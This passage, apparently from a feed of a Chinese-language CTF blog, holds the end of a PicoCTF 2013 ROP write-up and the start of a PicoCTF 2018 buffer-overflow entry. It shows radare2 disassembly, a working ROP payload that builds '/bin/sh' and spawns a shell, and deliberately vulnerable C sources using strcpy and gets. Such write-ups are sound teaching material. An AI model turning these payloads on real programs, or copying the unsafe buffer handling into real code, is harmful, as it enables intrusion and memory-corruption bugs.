+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-10&quot; title=&quot;10&quot;&gt;|      ,==&amp;lt;&lt;span class=&quot;bn&quot;&gt; 0x08048f21      &lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;7516&lt;/span&gt;           &lt;span class=&quot;bu&quot;&gt;jne&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt; 0x8048f39&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-11&quot; title=&quot;11&quot;&gt;|      ||&lt;span class=&quot;bn&quot;&gt;   0x08048f23      &lt;/span&gt;b8cc5e0c08     &lt;span class=&quot;bu&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;, &lt;span class=&quot;bu&quot;&gt;str&lt;/span&gt;.bin            &lt;span class=&quot;co&quot;&gt;; 0x80c5ecc ; &amp;quot;/bin&amp;quot;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-12&quot; title=&quot;12&quot;&gt;|      ||&lt;span class=&quot;bn&quot;&gt;   0x08048f28      &lt;/span&gt;8b10           &lt;span class=&quot;bu&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;edx&lt;/span&gt;, &lt;span class=&quot;dt&quot;&gt;dword&lt;/span&gt; [&lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;]&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-13&quot; title=&quot;13&quot;&gt;|      ||&lt;span class=&quot;bn&quot;&gt;   0x08048f2a      &lt;/span&gt;89152c110f08   &lt;span class=&quot;bu&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;dword&lt;/span&gt; [obj.exec_string], &lt;span class=&quot;kw&quot;&gt;edx&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;; [0x80f112c:4]=0&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-14&quot; title=&quot;14&quot;&gt;|      ||&lt;span class=&quot;bn&quot;&gt;   0x08048f30      &lt;/span&gt;0fb64004       &lt;span class=&quot;bu&quot;&gt;movzx&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;, &lt;span class=&quot;dt&quot;&gt;byte&lt;/span&gt; [&lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt; + &lt;span class=&quot;dv&quot;&gt;4&lt;/span&gt;]   &lt;span class=&quot;co&quot;&gt;; [0x4:1]=255 ; 4&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-15&quot; title=&quot;15&quot;&gt;|      ||&lt;span class=&quot;bn&quot;&gt;   0x08048f34      &lt;/span&gt;a230110f08     &lt;span class=&quot;bu&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;byte&lt;/span&gt; [&lt;span class=&quot;bn&quot;&gt;0x80f1130&lt;/span&gt;], &lt;span class=&quot;kw&quot;&gt;al&lt;/span&gt;    &lt;span class=&quot;co&quot;&gt;; [0x80f1130:1]=0&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-16&quot; title=&quot;16&quot;&gt;|      ||      &lt;span class=&quot;co&quot;&gt;; JMP XREF from 0x08048f18 (sym.call_me_with_two_args)&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-17&quot; title=&quot;17&quot;&gt;|      ||      &lt;span class=&quot;co&quot;&gt;; JMP XREF from 0x08048f21 (sym.call_me_with_two_args)&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-18&quot; title=&quot;18&quot;&gt;|      ``-&amp;gt;&lt;span class=&quot;bn&quot;&gt; 0x08048f39      &lt;/span&gt;5d             &lt;span class=&quot;bu&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-19&quot; title=&quot;19&quot;&gt;\&lt;span class=&quot;bn&quot;&gt;           0x08048f3a      &lt;/span&gt;c3             &lt;span class=&quot;bu&quot;&gt;ret&lt;/span&gt;&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;溢出后的第一个目标就是跳到 &lt;code&gt;0x08048f23&lt;/code&gt;，先填充上 “/bin”&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb7&quot;&gt;&lt;pre class=&quot;sourceCode python&quot;&gt;&lt;code class=&quot;sourceCode python&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb7-1&quot; title=&quot;1&quot;&gt;&lt;span class=&quot;bu&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;0x88&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;0000&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\x23\x8f\x04\x08&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb7-2&quot; title=&quot;2&quot;&gt;                 ↑ebp ↑返回地址&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;然后向下执行，会 &lt;code&gt;pop&lt;/code&gt; 一下 &lt;code&gt;ebp&lt;/code&gt;，这个我们随便填上点东西就可以了；然后 &lt;code&gt;call_me_with_two_args&lt;/code&gt; 返回，我们需要它返回至 &lt;code&gt;strcpy&lt;/code&gt;，同时还需要构造 strcpy 的参数：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb8&quot;&gt;&lt;pre class=&quot;sourceCode python&quot;&gt;&lt;code class=&quot;sourceCode python&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb8-1&quot; title=&quot;1&quot;&gt;                                          ↓call_me_with_two_args pop ebp        ↓strcpy参数1    ↓strcpy参数2&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb8-2&quot; title=&quot;2&quot;&gt;&lt;span class=&quot;bu&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;0x88&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;0000&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\x23\x8f\x04\x08&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;0000&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\xAA\xAA\xAA\xAA&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;\x??\x??\x??\x??&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb8-3&quot; title=&quot;3&quot;&gt;                 ↑ebp ↑返回地址                 ↑strcpy的地址    ↑strcpy的返回地址&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;首先先来确定 &lt;code&gt;strcpy&lt;/code&gt; 的地址。在 r2 中查一下符号：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[0x08048df8]&amp;gt; is | grep strcpy
+513 0x000260c0 0x0806e0c0  LOCAL   FUNC  139 __strcpy_ia32
+881 0x00026070 0x0806e070 GLOBAL   LOOS   69 strcpy
+1687 0x0002aa40 0x08072a40 GLOBAL   FUNC 6219 __strcpy_ssse3
+1864 0x00030670 0x08078670 GLOBAL   FUNC 1509 __strcpy_sse2&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;上面的 &lt;code&gt;strcpy&lt;/code&gt; 只是一个入口，会根据 CPU 的不同特性&lt;strong&gt;返回&lt;/strong&gt;不同实现的地址（而不是继续调用实现函数），因此这个并不是我们想要的。我们可以直接调用 &lt;code&gt;__strcpy_ia32&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;至于参数，第一个参数自然就是 &lt;code&gt;exec_string + 4&lt;/code&gt;，第二个参数是 &lt;code&gt;/sh&lt;/code&gt; 的地址。&lt;/p&gt;
+&lt;p&gt;在上面的命令中，还有一块 &lt;code&gt;\x??\x??\x??\x??&lt;/code&gt; 没有确定，这是 &lt;code&gt;strcpy&lt;/code&gt; 函数的返回地址。这里直接填入 &lt;code&gt;exec_the_string&lt;/code&gt; 函数的地址即可。因此完整的爆破命令为：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb10&quot;&gt;&lt;pre class=&quot;sourceCode python&quot;&gt;&lt;code class=&quot;sourceCode python&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb10-1&quot; title=&quot;1&quot;&gt;                                                      ↓call_me_with_two_args pop ebp        ↓strcpy参数1    ↓strcpy参数2&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb10-2&quot; title=&quot;2&quot;&gt;(python &lt;span class=&quot;op&quot;&gt;-&lt;/span&gt;c &lt;span class=&quot;st&quot;&gt;&amp;quot;print &amp;#39;0&amp;#39;*0x88 + &amp;#39;0000&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\x23\x8f\x04\x08&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39; + &amp;#39;0000&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\xc0\xe0\x06\x08\xd0\x8e\x04\x08\x30\x11\x0f\x08\xc8\x5e\x0c\x08\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;cat) &lt;span class=&quot;op&quot;&gt;|&lt;/span&gt; .&lt;span class=&quot;op&quot;&gt;/&lt;/span&gt;rop4&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb10-3&quot; title=&quot;3&quot;&gt;                             ↑ebp ↑返回地址                 ↑strcpy的地址    ↑strcpy的返回地址&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;</content><author><name></name></author><category term="pwn" /><summary type="html">这道题是 PicoCTF 2013 ROP 系列的最后一题：</summary></entry><entry><title type="html">Buffer Overflow 0 / 1 / 2</title><link href="https://ctf.dontpanic.blog/writeups/picoctf-2018-buffer-overflow-012.html" rel="alternate" type="text/html" title="Buffer Overflow 0 / 1 / 2" /><published>2019-02-26T00:00:00+00:00</published><updated>2019-02-26T00:00:00+00:00</updated><id>https://ctf.dontpanic.blog/writeups/picoctf-2018-buffer-overflow-012</id><content type="html" xml:base="https://ctf.dontpanic.blog/writeups/picoctf-2018-buffer-overflow-012.html">&lt;p&gt;因为这几道题都比较简单，所以合并在一起了：&lt;/p&gt;
+&lt;h4 id=&quot;第-0-题&quot;&gt;第 0 题&lt;/h4&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-1&quot; title=&quot;1&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-2&quot; title=&quot;2&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-3&quot; title=&quot;3&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-4&quot; title=&quot;4&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;signal.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-5&quot; title=&quot;5&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-6&quot; title=&quot;6&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#define FLAGSIZE_MAX 64&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-7&quot; title=&quot;7&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-8&quot; title=&quot;8&quot;&gt;&lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; flag[FLAGSIZE_MAX];&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-9&quot; title=&quot;9&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-10&quot; title=&quot;10&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; sigsegv_handler(&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; sig) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-11&quot; title=&quot;11&quot;&gt;  fprintf(stderr, &lt;span class=&quot;st&quot;&gt;&amp;quot;%s&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;, flag);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-12&quot; title=&quot;12&quot;&gt;  fflush(stderr);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-13&quot; title=&quot;13&quot;&gt;  exit(&lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-14&quot; title=&quot;14&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-15&quot; title=&quot;15&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-16&quot; title=&quot;16&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; vuln(&lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; *input){&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-17&quot; title=&quot;17&quot;&gt;  &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; buf[&lt;span class=&quot;dv&quot;&gt;16&lt;/span&gt;];&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-18&quot; title=&quot;18&quot;&gt;  strcpy(buf, input);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-19&quot; title=&quot;19&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-20&quot; title=&quot;20&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-21&quot; title=&quot;21&quot;&gt;&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; main(&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; **argv){&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-22&quot; title=&quot;22&quot;&gt;  &lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-23&quot; title=&quot;23&quot;&gt;  &lt;span class=&quot;dt&quot;&gt;FILE&lt;/span&gt; *f = fopen(&lt;span class=&quot;st&quot;&gt;&amp;quot;flag.txt&amp;quot;&lt;/span&gt;,&lt;span class=&quot;st&quot;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-24&quot; title=&quot;24&quot;&gt;  &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; (f == NULL) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-25&quot; title=&quot;25&quot;&gt;    printf(&lt;span class=&quot;st&quot;&gt;&amp;quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-26&quot; title=&quot;26&quot;&gt;    exit(&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-27&quot; title=&quot;27&quot;&gt;  }&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-28&quot; title=&quot;28&quot;&gt;  fgets(flag,FLAGSIZE_MAX,f);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-29&quot; title=&quot;29&quot;&gt;  signal(SIGSEGV, sigsegv_handler);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-30&quot; title=&quot;30&quot;&gt;  &lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-31&quot; title=&quot;31&quot;&gt;  gid_t gid = getegid();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-32&quot; title=&quot;32&quot;&gt;  setresgid(gid, gid, gid);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-33&quot; title=&quot;33&quot;&gt;  &lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-34&quot; title=&quot;34&quot;&gt;  &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; (argc &amp;gt; &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-35&quot; title=&quot;35&quot;&gt;    vuln(argv[&lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;]);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-36&quot; title=&quot;36&quot;&gt;    printf(&lt;span class=&quot;st&quot;&gt;&amp;quot;Thanks! Received: %s&amp;quot;&lt;/span&gt;, argv[&lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;]);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-37&quot; title=&quot;37&quot;&gt;  }&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-38&quot; title=&quot;38&quot;&gt;  &lt;span class=&quot;cf&quot;&gt;else&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-39&quot; title=&quot;39&quot;&gt;    printf(&lt;span class=&quot;st&quot;&gt;&amp;quot;This program takes 1 argument.&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-40&quot; title=&quot;40&quot;&gt;  &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-41&quot; title=&quot;41&quot;&gt;}&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+&lt;div id=&quot;writeup_show_button&quot; style=&quot;cursor: pointer&quot;&gt;
+    &lt;div class=&quot;alert alert-warning&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处显示 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;writeup_hide_button&quot; style=&quot;cursor: pointer&quot; class=&quot;d-none&quot;&gt;
+    &lt;div class=&quot;alert alert-info&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处隐藏 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;script&gt;
+(function()
+{
+    var parent = document.scripts[document.scripts.length - 1].parentNode;
+    parent.querySelector(&quot;#writeup_show_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.remove(&quot;d-none&quot;);
+    }
+    parent.querySelector(&quot;#writeup_hide_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.add(&quot;d-none&quot;);
+    }
+})();
+&lt;/script&gt;
+&lt;div id=&quot;writeup&quot; class=&quot;d-none&quot; markdown=&quot;1&quot;&gt;
+&lt;p&gt;只要命令行参数足够长就可以把程序搞崩溃：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h4 id=&quot;第-1-题&quot;&gt;第 1 题&lt;/h4&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-1&quot; title=&quot;1&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-2&quot; title=&quot;2&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-3&quot; title=&quot;3&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-4&quot; title=&quot;4&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-5&quot; title=&quot;5&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-6&quot; title=&quot;6&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;quot;asm.h&amp;quot;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-7&quot; title=&quot;7&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-8&quot; title=&quot;8&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#define BUFSIZE 32&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-9&quot; title=&quot;9&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#define FLAGSIZE 64&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-10&quot; title=&quot;10&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-11&quot; title=&quot;11&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; win() {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-12&quot; title=&quot;12&quot;&gt;  &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; buf[FLAGSIZE];&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-13&quot; title=&quot;13&quot;&gt;  &lt;span class=&quot;dt&quot;&gt;FILE&lt;/span&gt; *f = fopen(&lt;span class=&quot;st&quot;&gt;&amp;quot;flag.txt&amp;quot;&lt;/span&gt;,&lt;span class=&quot;st&quot;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-14&quot; title=&quot;14&quot;&gt;  &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; (f == NULL) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-15&quot; title=&quot;15&quot;&gt;    printf(&lt;span class=&quot;st&quot;&gt;&amp;quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-16&quot; title=&quot;16&quot;&gt;    exit(&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-17&quot; title=&quot;17&quot;&gt;  }&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-18&quot; title=&quot;18&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-19&quot; title=&quot;19&quot;&gt;  fgets(buf,FLAGSIZE,f);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-20&quot; title=&quot;20&quot;&gt;  printf(buf);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-21&quot; title=&quot;21&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-22&quot; title=&quot;22&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-23&quot; title=&quot;23&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; vuln(){&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-24&quot; title=&quot;24&quot;&gt;  &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; buf[BUFSIZE];&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-25&quot; title=&quot;25&quot;&gt;  gets(buf);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-26&quot; title=&quot;26&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-27&quot; title=&quot;27&quot;&gt;  printf(&lt;span class=&quot;st&quot;&gt;&amp;quot;Okay, time to return... Fingers Crossed... Jumping to 0x%x&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;, get_return_address());&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-28&quot; title=&quot;28&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-29&quot; title=&quot;29&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-30&quot; title=&quot;30&quot;&gt;&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; main(&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; **argv){&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-31&quot; title=&quot;31&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-32&quot; title=&quot;32&quot;&gt;  setvbuf(stdout, NULL, _IONBF, &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-33&quot; title=&quot;33&quot;&gt;  &lt;/a&gt;
